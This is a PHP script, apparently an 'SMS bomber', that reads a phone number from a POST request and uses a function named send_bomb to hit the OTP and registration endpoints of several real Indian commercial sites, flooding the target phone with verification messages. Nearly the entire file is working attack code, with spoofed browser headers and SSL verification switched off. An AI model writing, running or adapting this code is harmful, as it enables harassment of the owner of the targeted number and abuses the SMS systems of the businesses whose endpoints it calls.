<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: *");
header("Content-Type: application/json");
    $number = $_POST['number'];
echo $number;
        # code...
      #echo "<p class='text-success font-weight-bold'> Bombing started on <strong class='text-danger' >".$number."</strong> </p>";

        # CURL 

        function send_bomb($url,$data,$headers){
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL,$url);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_HTTPHEADER,$headers);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $output= curl_exec ($ch);
            curl_close ($ch);
            $json=json_decode($output,true);
        }
        
        # URL DATA HEADERS
        
        $url1='https://www.medibuddy.in/unified-login/user/register';
        
        $data1= '{"phonenumber":"'.$number.'"}';
        
        $headers1 = ['www.medibuddy.in','Content-Type: application/json','Accept: application/json, text/plain, */*','Origin: https://www.medibuddy.in','Referer: https://www.medibuddy.in/','Accept-Encoding: gzip, deflate','Accept-Language: en-US,en;q=0.9'];
        
        send_bomb($url1,$data1,$headers1);
        
        #############################################################################
        
        $url7 = "https://api.krishify.com/api/v1/auth/phone-login/generate";
        
        $data7 = '{"phone_number":"'.$number.'","name":"Tetu Mama"}';
        
        $headers7 = array(
            "Host: api.krishify.com",
            "content-length: 48",
            "accept-language: hi",
            "app-name: KRISHIFY-DEALS",
            "Content-Type: application/json",
            "accept: application/json, text/plain, */*",
            "app-version-code: 320",
            "origin: https://deals.krishify.com",
            "referer: https://deals.krishify.com/",
            "accept-encoding: gzip, deflate, br"
        );
        
        send_bomb($url7,$data7,$headers7);

        #############################################################################
        
        $url2='https://www.dealshare.in/api/1.0/get-otp';
        
        $data2= '{"phoneNumber":"'.$number.'"}';
        
        $headers2 = ['www.dealshare.in','Accept: application/json, text/plain, */*','Content-Type: application/json','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.54 Safari/537.36','Origin: https://www.dealshare.in','Referer: https://www.dealshare.in/','Accept-Encoding: gzip, deflate','Accept-Language: en-US,en;q=0.9'];
        
        send_bomb($url2,$data2,$headers2);

        #############################################################################

        $url3='https://www.decathlon.in/api/login/sendotp';

        $data3= '{"param":"'.$number.'","source":1}';
        
        $headers3 = ['Host: www.decathlon.in','Accept: application/json, text/plain, */*','Content-Type: application/json','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36','Origin: https://www.decathlon.in','Referer: https://www.decathlon.in/','Accept-Encoding: gzip, deflate','Accept-Language: en-US,en;q=0.9'];
        
        send_bomb($url3,$data3,$headers3);

        #############################################################################

        $url10 = "https://ullu.app/ulluCore/api/v1/otp/send/new/cdiOpn?mobileNumber='.$number.'";
        
        $data10 = "mobileNumber='.$number.'";
        
        $headers10 = array(
            "Host: ullu.app",
            "content-length: 0",
            "accept: application/json, text/plain, */*",
            "origin: https://ullu.app",
            "referer: https://ullu.app/",
            "accept-encoding: gzip, deflate, br",
            "accept-language: en-US,en;q=0.9",
            "Content-Type: application/x-www-form-urlencoded"
        );
    
        send_bomb($url10,$data10,$headers10);

        #############################################################################
        
        $url11 = "https://api.tatadigital.com/api/v2/sso/check-phone";
        
        $data11 = '{"countryCode":"91","phone":"'.$number.'","sendOtp":true}';
        
        $headers11 = array(
            "Host: api.tatadigital.com",
            "content-length: 56",
            "accept: */*",
            "client_id: WESTSIDE-WEB-APP",
            "Content-Type: application/json",
            "origin: https://www.westside.com",
            "referer: https://www.westside.com/",
            "accept-encoding: gzip, deflate, br",
            "accept-language: en-US,en;q=0.9"
        );
        
        send_bomb($url11,$data11,$headers11);

$url15 ='https://apinew.moglix.com/nodeApi/v1/login/sendOTP';

$data15 = '{"phone":"'.$number.'","email":"","type":"p","source":"signup","device":"desktop"}';

$headers15 = ['Host: apinew.moglix.com','User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36','Content-Type: application/json','Accept: application/json, text/plain, */*','Origin: https://www.moglix.com','Accept-Encoding: gzip, deflate','Accept-Language: en-US,en;q=0.9'];

//send_bomb($url15,$data15,$headers15);

        ############# CALL THE FUNCTION #############
?>